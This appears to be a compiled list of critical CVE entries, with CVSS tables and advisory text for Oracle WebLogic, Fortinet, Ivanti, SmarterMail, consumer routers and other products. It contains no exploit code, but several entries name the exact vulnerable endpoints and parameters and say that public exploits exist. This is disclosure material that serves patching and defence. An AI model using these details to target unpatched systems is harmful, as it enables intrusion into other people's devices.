HTTP Protocol Stack Remote Code Execution Vulnerability

### CVE-2021-1498

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2021-05-06T12:41:31.982Z |

Multiple vulnerabilities in the web-based management interface of Cisco HyperFlex HX could allow an unauthenticated, remote attacker to perform command injection attacks against an affected device. For more information about these vulnerabilities, see the Details section of this advisory.

### CVE-2021-26897

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:O/RC:C` |
| Weaknesses | `N/A` |
| Published | 2021-03-11T15:43:32.000Z |

Windows DNS Server Remote Code Execution Vulnerability

### CVE-2020-14882

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2020-10-21T14:04:30.000Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Console). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via HTTP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2020-14841

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2020-10-21T14:04:28.000Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). Supported versions that are affected are 10.3.6.0.0, 12.1.3.0.0, 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via IIOP to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2020-26919

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:U/UI:N` |
| Weaknesses | `N/A` |
| Published | 2020-10-09T06:29:14.000Z |

NETGEAR JGS516PE devices before 2.6.0.43 are affected by lack of access control at the function level.

### CVE-2020-14644

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2020-07-15T17:34:31.000Z |

Vulnerability in the Oracle WebLogic Server product of Oracle Fusion Middleware (component: Core). Supported versions that are affected are 12.2.1.3.0, 12.2.1.4.0 and 14.1.1.0.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via IIOP, T3 to compromise Oracle WebLogic Server. Successful attacks of this vulnerability can result in takeover of Oracle WebLogic Server. CVSS 3.1 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2020-3161

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-20` |
| Published | 2020-04-15T20:10:11.570Z |

A vulnerability in the web server for Cisco IP Phones could allow an unauthenticated, remote attacker to execute code with root privileges or cause a reload of an affected IP phone, resulting in a denial of service (DoS) condition. The vulnerability is due to a lack of proper input validation of HTTP requests. An attacker could exploit this vulnerability by sending a crafted HTTP request to the web server of a targeted device. A successful exploit could allow the attacker to remotely execute code with root privileges or cause a reload of an affected IP phone, resulting in a DoS condition.

### CVE-2020-10189

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AC:L/AV:N/A:H/C:H/I:H/PR:N/S:U/UI:N` |
| Weaknesses | `N/A` |
| Published | 2020-03-06T16:05:22.000Z |

Zoho ManageEngine Desktop Central before 10.0.474 allows remote code execution because of deserialization of untrusted data in getChartImage in the FileStorage class. This is related to the CewolfServlet and MDMLogUploaderServlet servlets.

### CVE-2020-4211

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/A:H/S:U/C:H/UI:N/I:H/AV:N/PR:N/AC:L/RC:C/E:U/RL:O` |
| Weaknesses | `N/A` |
| Published | 2020-02-24T15:35:31.374Z |

IBM Spectrum Protect Plus 10.1.0 and 10.1.5 could allow a remote attacker to execute arbitrary code on the system. By using a specially crafted HTTP command, an attacker could exploit this vulnerability to execute arbitrary command on the system. IBM X-Force ID: 175022.

### CVE-2020-2555

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2020-01-15T16:34:00.000Z |

Vulnerability in the Oracle Coherence product of Oracle Fusion Middleware (component: Caching,CacheStore,Invocation). Supported versions that are affected are 3.7.1.0, 12.1.3.0.0, 12.2.1.3.0 and 12.2.1.4.0. Easily exploitable vulnerability allows unauthenticated attacker with network access via T3 to compromise Oracle Coherence. Successful attacks of this vulnerability can result in takeover of Oracle Coherence. CVSS 3.0 Base Score 9.8 (Confidentiality, Integrity and Availability impacts). CVSS Vector: (CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H).

### CVE-2019-15976

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-798` |
| Published | 2020-01-06T07:40:13.517Z |

Multiple vulnerabilities in the authentication mechanisms of Cisco Data Center Network Manager (DCNM) could allow an unauthenticated, remote attacker to bypass authentication and execute arbitrary actions with administrative privileges on an affected device. For more information about these vulnerabilities, see the Details section of this advisory.

### CVE-2019-5029

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-78` |
| Published | 2019-11-13T22:34:02.000Z |

An exploitable command injection vulnerability exists in the Config editor of the Exhibitor Web UI versions 1.0.9 to 1.7.1. Arbitrary shell commands surrounded by backticks or $() can be inserted into the editor and will be executed by the Exhibitor process when it launches ZooKeeper. An attacker can execute any command as the user running the Exhibitor process.

### CVE-2019-1620

| 項目 | 値 |
|------|-----|
| CVSS | `9.8` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` |
| Weaknesses | `CWE-264` |
| Published | 2019-06-27T03:05:26.301Z |

A vulnerability in the web-based management interface of Cisco Data Center Network Manager (DCNM) could allow an unauthenticated, remote attacker to upload arbitrary files on an affected device. The vulnerability is due to incorrect permission settings in affected DCNM software. An attacker could exploit this vulnerability by uploading specially crafted data to the affected device. A successful exploit could allow the attacker to write arbitrary files on the filesystem and execute code with root privileges on the affected device.

### CVE-2024-23108

| 項目 | 値 |
|------|-----|
| CVSS | `9.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:X/RC:X` |
| Weaknesses | `CWE-78` |
| Published | 2024-02-05T13:26:15.727Z |

An improper neutralization of special elements used in an os command ('os command injection') vulnerability in Fortinet  allows attacker to execute unauthorized code or commands via via crafted API requests.

### CVE-2023-34992

| 項目 | 値 |
|------|-----|
| CVSS | `9.7` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H/E:F/RL:X/RC:X` |
| Weaknesses | `CWE-78` |
| Published | 2023-10-10T16:50:21.319Z |

A improper neutralization of special elements used in an os command ('os command injection') vulnerability in Fortinet  allows attacker to execute unauthorized code or commands via crafted API requests.

### CVE-2026-10789

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-94` |
| Published | 2026-06-22T18:16:30.620 |

A maliciously crafted webpage, when visited by a user with Autodesk Fusion Desktop running and the MCP extension enabled, can trigger a vulnerability in the MCP extension that could allow arbitrary code execution. A successful exploit may allow code to execute with the privileges of the current user.

### CVE-2025-10573

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-79` |
| Published | 2025-12-09T15:55:23.422Z |

Stored XSS in Ivanti Endpoint Manager prior to version 2024 SU4 SR1 allows a remote unauthenticated attacker to execute arbitrary JavaScript in the context of an administrator session. User interaction is required.

### CVE-2025-25257

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:X/RC:C` |
| Weaknesses | `CWE-89` |
| Published | 2025-07-17T15:10:04.532Z |

An improper neutralization of special elements used in an SQL command ('SQL Injection') vulnerability [CWE-89] vulnerability in Fortinet FortiWeb 7.6.0 through 7.6.3, FortiWeb 7.4.0 through 7.4.7, FortiWeb 7.2.0 through 7.2.10, FortiWeb 7.0.0 through 7.0.10 allows an unauthenticated attacker to execute unauthorized SQL code or commands via crafted HTTP or HTTPs requests.

### CVE-2024-55591

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:W/RC:C` |
| Weaknesses | `CWE-288` |
| Published | 2025-01-14T14:08:34.207Z |

An Authentication Bypass Using an Alternate Path or Channel vulnerability [CWE-288] affecting FortiOS version 7.0.0 through 7.0.16 and FortiProxy version 7.0.0 through 7.0.19 and 7.2.0 through 7.2.12 allows a remote attacker to gain super-admin privileges via crafted requests to Node.js websocket module.

### CVE-2024-29824

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.0/AV:A/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` |
| Weaknesses | `N/A` |
| Published | 2024-05-31T17:38:31.331Z |

An unspecified SQL Injection vulnerability in Core server of Ivanti EPM 2022 SU5 and prior allows an unauthenticated attacker within the same network to execute arbitrary code.

### CVE-2024-21762

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:H/RL:W/RC:C` |
| Weaknesses | `CWE-787` |
| Published | 2024-02-09T08:14:25.954Z |

A out-of-bounds write in Fortinet FortiOS versions 7.4.0 through 7.4.2, 7.2.0 through 7.2.6, 7.0.0 through 7.0.13, 6.4.0 through 6.4.14, 6.2.0 through 6.2.15, 6.0.0 through 6.0.17, FortiProxy versions 7.4.0 through 7.4.2, 7.2.0 through 7.2.8, 7.0.0 through 7.0.14, 2.0.0 through 2.0.13, 1.2.0 through 1.2.13, 1.1.0 through 1.1.6, 1.0.0 through 1.0.7 allows attacker to execute unauthorized code or commands via specifically crafted requests

### CVE-2023-48365

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:N/C:H/I:H/PR:L/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2023-11-15T00:00:00.000Z |

Qlik Sense Enterprise for Windows before August 2023 Patch 2 allows unauthenticated remote code execution, aka QB-21683. Due to improper validation of HTTP headers, a remote attacker is able to elevate their privilege by tunneling HTTP requests, allowing them to execute HTTP requests on the backend server that hosts the repository application. The fixed versions are August 2023 Patch 2, May 2023 Patch 6, February 2023 Patch 10, November 2022 Patch 12, August 2022 Patch 14, May 2022 Patch 16, February 2022 Patch 15, and November 2021 Patch 17. NOTE: this issue exists because of an incomplete fix for CVE-2023-41265.

### CVE-2023-34993

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H/E:F/RL:X/RC:X` |
| Weaknesses | `CWE-78` |
| Published | 2023-10-10T16:51:08.092Z |

A improper neutralization of special elements used in an os command ('os command injection') in Fortinet FortiWLM version 8.6.0 through 8.6.5 and 8.5.0 through 8.5.4 allows attacker to execute unauthorized code or commands via specifically crafted http get request parameters.

### CVE-2023-41265

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.1/AC:L/AV:N/A:N/C:H/I:H/PR:L/S:C/UI:N` |
| Weaknesses | `N/A` |
| Published | 2023-08-29T00:00:00.000Z |

An HTTP Request Tunneling vulnerability found in Qlik Sense Enterprise for Windows for versions May 2023 Patch 3 and earlier, February 2023 Patch 7 and earlier, November 2022 Patch 10 and earlier, and August 2022 Patch 12 and earlier allows a remote attacker to elevate their privilege by tunneling HTTP requests in the raw HTTP request. This allows them to send requests that get executed by the backend server hosting the repository application. This is fixed in August 2023 IR, May 2023 Patch 4, February 2023 Patch 8, November 2022 Patch 11, and August 2022 Patch 13.

### CVE-2020-13564

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-80` |
| Published | 2021-02-01T15:07:44.000Z |

A cross-site scripting vulnerability exists in the template functionality of phpGACL 3.3.7. A specially crafted HTTP request can lead to arbitrary JavaScript execution. An attacker can provide a crafted URL to trigger this vulnerability in the phpGACL template acl_id parameter.

### CVE-2020-13563

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-80` |
| Published | 2021-02-01T15:06:17.000Z |

A cross-site scripting vulnerability exists in the template functionality of phpGACL 3.3.7. A specially crafted HTTP request can lead to arbitrary JavaScript execution. An attacker can provide a crafted URL to trigger this vulnerability in the phpGACL template group_id parameter.

### CVE-2020-13562

| 項目 | 値 |
|------|-----|
| CVSS | `9.6` |
| Vector | `CVSS:3.0/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:H/A:H` |
| Weaknesses | `CWE-80` |
| Published | 2021-02-01T15:05:16.000Z |

A cross-site scripting vulnerability exists in the template functionality of phpGACL 3.3.7. A specially crafted HTTP request can lead to arbitrary JavaScript execution. An attacker can provide a crafted URL to trigger this vulnaerability in the phpGACL template action parameter.

### CVE-2026-49468

| 項目 | 値 |
|------|-----|
| CVSS | `9.5` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-290` |
| Published | 2026-06-22T21:16:25.190 |

LiteLLM is a proxy server (AI Gateway) to call LLM APIs in OpenAI (or native) format. Prior to 1.84.0,  This vulnerability is fixed in 1.84.0.

### CVE-2024-53677

| 項目 | 値 |
|------|-----|
| CVSS | `9.5` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/S:N/AU:Y/R:A/V:C/RE:L/U:Red` |
| Weaknesses | `N/A` |
| Published | 2024-12-11T15:35:43.389Z |

File upload logic in Apache Struts is flawed. An attacker can manipulate file upload params to enable paths traversal and under some circumstances this can lead to uploading a malicious file which can be used to perform Remote Code Execution.

This issue affects Apache Struts: from 2.0.0 before 6.4.0.

Users are recommended to upgrade to version 6.4.0 at least and migrate to the new  file upload mechanism https://struts.apache.org/core-developers/file-upload . If you are not using an old file upload logic based on FileuploadInterceptor your application is safe.

You can find more details in  https://cwiki.apache.org/confluence/display/WW/S2-067

### CVE-2024-9487

| 項目 | 値 |
|------|-----|
| CVSS | `9.5` |
| Vector | `CVSS:4.0/AV:N/AC:H/AT:P/PR:N/UI:N/VC:H/VI:H/VA:L/SC:H/SI:H/SA:L/R:U/V:C/RE:M/U:Red` |
| Weaknesses | `CWE-347` |
| Published | 2024-10-10T21:08:48.720Z |

An improper verification of cryptographic signature vulnerability was identified in GitHub Enterprise Server that allowed SAML SSO authentication to be bypassed resulting in unauthorized provisioning of users and access to the instance. Exploitation required the encrypted assertions feature to be enabled, and the attacker would require direct network access as well as a signed SAML response or metadata document. This vulnerability affected all versions of GitHub Enterprise Server prior to 3.15 and was fixed in versions 3.11.16, 3.12.10, 3.13.5, and 3.14.2. This vulnerability was reported via the GitHub Bug Bounty program.

### CVE-2026-44089

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-121` |
| Published | 2026-06-23T13:16:40.400 |

Totolink EX1200L router is vulnerable to Buffer Overflow in the login functionality in cgi-bin/cstecgi.cgi endpoint. This vulnerability could be exploited to cause the program to crash and to execute code remotely. This allows the attacker to perform actions as root including reading and editing data, as well as bricking the router.

Because vendor contact attempts were unsuccessful, the vulnerability has only been confirmed in version 9.3.5u.6146_B20201023 but may also affect other versions.

### CVE-2025-34148

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-07T16:45:26.006Z |

An unauthenticated OS command injection vulnerability exists in the Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02). When configuring the device in WISP mode, the 'ssid' parameter is passed unsanitized to system-level scripts. This allows remote attackers within Wi-Fi range to inject arbitrary shell commands that execute as root, resulting in full device compromise.

### CVE-2025-34152

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-08-07T16:44:59.919Z |

An unauthenticated OS command injection vulnerability exists in the Shenzhen Aitemi M300 Wi-Fi Repeater (hardware model MT02) via the 'time' parameter of the '/protocol.csp?' endpoint. The input is processed by the internal date '-s' command without rebooting or disrupting HTTP service. Unlike other injection points, this vector allows remote compromise without triggering visible configuration changes.

### CVE-2025-34049

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-06-26T15:52:12.197Z |

An OS command injection vulnerability exists in the OptiLink ONT1GEW GPON router firmware version V2.1.11_X101 Build 1127.190306 and earlier. The router’s web management interface fails to properly sanitize user input in the target_addr parameter of the formTracert and formPing administrative endpoints. An authenticated attacker can inject arbitrary operating system commands, which are executed with root privileges, leading to remote code execution. Successful exploitation enables full compromise of the device. Exploitation evidence was observed by the Shadowserver Foundation on 2025-02-04 UTC.

### CVE-2025-49596

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-306` |
| Published | 2025-06-13T20:11:40.453Z |

The MCP inspector is a developer tool for testing and debugging MCP servers. Versions of MCP Inspector below 0.14.1 are vulnerable to remote code execution due to lack of authentication between the Inspector client and proxy, allowing unauthenticated requests to launch MCP commands over stdio. Users should immediately upgrade to version 0.14.1 or later to address these vulnerabilities.

### CVE-2025-48047

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:H/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-78` |
| Published | 2025-05-29T12:36:13.667Z |

An authenticated user can perform command injection via unsanitized input to the NetFax Server’s ping functionality via the /test.php endpoint.

### CVE-2024-9264

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `CWE-94` |
| Published | 2024-10-18T03:20:52.489Z |

The SQL Expressions experimental feature of Grafana allows for the evaluation of `duckdb` queries containing user input. These queries are insufficiently sanitized before being passed to `duckdb`, leading to a command injection and local file inclusion vulnerability. Any user with the VIEWER or higher permission is capable of executing this attack.  The `duckdb` binary must be present in Grafana's $PATH for this attack to function; by default, this binary is not installed in Grafana distributions.

### CVE-2024-6235

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:4.0/AV:A/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H` |
| Weaknesses | `N/A` |
| Published | 2024-07-10T19:07:58.885Z |

Sensitive information disclosure in NetScaler Console

### CVE-2023-4966

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` |
| Weaknesses | `CWE-119` |
| Published | 2023-10-10T13:12:17.644Z |

Sensitive information disclosure in NetScaler ADC and NetScaler Gateway when configured as a Gateway (VPN virtual server, ICA Proxy, CVPN, RDP Proxy) or AAA  virtual server.

### CVE-2023-2868

| 項目 | 値 |
|------|-----|
| CVSS | `9.4` |
| Vector | `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:L` |
| Weaknesses | `CWE-20` |
| Published | 2023-05-24T18:00:52.360Z |

A remote command injection vulnerability exists in the Barracuda Email Security Gateway (appliance form factor only) product effecting versions 5.1.3.001-9.2.0.006. The vulnerability arises out of a failure to comprehensively sanitize the processing of .tar file (tape archives). The vulnerability stems from incomplete input validation of a user-supplied .tar file as it pertains to the names of the files contained within the archive. As a consequence, a remote attacker can specifically format these file names in a particular manner that will result in remotely executing a system command through Perl's qx operator with the privileges of the Email Security Gateway product. This issue was fixed as part of BNSF-36456 patch. This patch was automatically applied to all customer appliances.

### CVE-2026-56315

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-184` |
| Published | 2026-06-23T13:16:45.770 |

picklescan before 1.0.4 fails to block at least seven Python standard library modules (including uuid, _osx_support, _aix_support, _pyrepl.pager, and imaplib) exposing eight functions that provide direct arbitrary command execution. Attackers can craft malicious pickle files importing these unblocked modules to achieve remote code execution while bypassing picklescan's safety validation entirely.

### CVE-2026-44727

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:A/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X` |
| Weaknesses | `CWE-79;CWE-1021` |
| Published | 2026-06-22T21:16:24.260 |

Jupyter Server is the backend for Jupyter web applications. Prior to 2.20, the nbconvert HTTP handlers in jupyter_server render user-authored notebook HTML under the Jupyter origin without a sandbox directive in their Content-Security-Policy. Combined with nbconvert.HTMLExporter's default non-sanitizing behavior, a notebook carrying an HTML payload in a display_data output triggers stored XSS with cookie access, full /api/* authority, and kernel RCE. This vulnerability is fixed in 2.20.

### CVE-2026-11499

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:X` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2026-06-08T07:00:23.672Z |

A vulnerability was determined in Tenda HG7HG9 and HG10 300001138_en_xpon. This affects the function formDOMAINBLK of the file /boaform/formDOMAINBLK. Executing a manipulation of the argument blkDomain can lead to stack-based buffer overflow. The attack may be performed from remote.

### CVE-2026-3055

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:L/SI:L/SA:L` |
| Weaknesses | `CWE-125` |
| Published | 2026-03-23T20:21:27.107Z |

Insufficient input validation in NetScaler ADC and NetScaler Gateway when configured as a SAML IDP leading to memory overread

### CVE-2026-24423

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-306` |
| Published | 2026-01-23T16:53:34.951Z |

SmarterTools SmarterMail versions prior to build 9511 contain an unauthenticated remote code execution vulnerability in the ConnectToHub API method. The attacker could point the SmarterMail to the malicious HTTP server, which serves the malicious OS command. This command will be executed by the vulnerable application.

### CVE-2026-23760

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-288` |
| Published | 2026-01-22T14:35:17.235Z |

SmarterTools SmarterMail versions prior to build 9511 contain an authentication bypass vulnerability in the password reset API. The force-reset-password endpoint permits anonymous requests and fails to verify the existing password or a reset token when resetting system administrator accounts. An unauthenticated attacker can supply a target administrator username and a new password to reset the account, resulting in full administrative compromise of the SmarterMail instance. NOTE: SmarterMail system administrator privileges grant the ability to execute operating system commands via built-in management functionality, effectively providing administrative (SYSTEM or root) access on the underlying host.

### CVE-2025-12420

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H/E:P/S:N/AU:Y/R:U/V:C/RE:H/U:Amber` |
| Weaknesses | `CWE-250` |
| Published | 2026-01-12T21:29:37.421Z |

A vulnerability has been identified in the ServiceNow AI Platform that could enable an unauthenticated user to impersonate another user and perform the operations that the impersonated user is entitled to perform.

ServiceNow has addressed this vulnerability by deploying a relevant security update to  hosted instances in October 2025. Security updates have also been provided to ServiceNow self-hosted customers, partners, and hosted customers with unique configurations. Additionally, the vulnerability is addressed in the listed Store App versions. We recommend that customers promptly apply an appropriate security update or upgrade if they have not already done so.

### CVE-2017-20216

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Weaknesses | `CWE-78` |
| Published | 2026-01-07T23:09:56.761Z |

FLIR Thermal Camera PT-Series firmware version 8.0.0.64 contains multiple unauthenticated remote command injection vulnerabilities in the controllerFlirSystem.php script. Attackers can execute arbitrary system commands as root by exploiting unsanitized POST parameters in the execFlirSystem() function through shell_exec() calls. Exploitation evidence was observed by the Shadowserver Foundation on 2026-01-06 (UTC).

### CVE-2025-15471

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-78;CWE-77` |
| Published | 2026-01-06T21:32:06.927Z |

A vulnerability was detected in TRENDnet TEW-713RE 1.02. The impacted element is an unknown function of the file /goformX/formFSrvX. The manipulation of the argument SZCMD results in os command injection. It is possible to launch the attack remotely. The exploit is now public and may be used. The vendor confirms: "The product in question TEW-731RE for CVE-2025-15471 has been discontinued and end of life since October 23, 2020. We no longer provide support for this product, so we are not able to confirm the vulnerabilities. We will make an announcement on the website product support page and notify customers who registered their products with us." This vulnerability only affects products that are no longer supported by the maintainer.

### CVE-2025-14879

| 項目 | 値 |
|------|-----|
| CVSS | `9.3` |
| Vector | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N/E:P` |
| Weaknesses | `CWE-121;CWE-119` |
| Published | 2025-12-18T17:02:07.884Z |

A weakness has been identified in Tenda WH450 1.0.0.18. Affected is an unknown function of the file /goform/onSSIDChange of the component HTTP Request Handler. This manipulation of the argument ssid_index causes stack-based buffer overflow. It is possible to initiate the attack remotely. The exploit has been made available to the public and could be used for attacks.

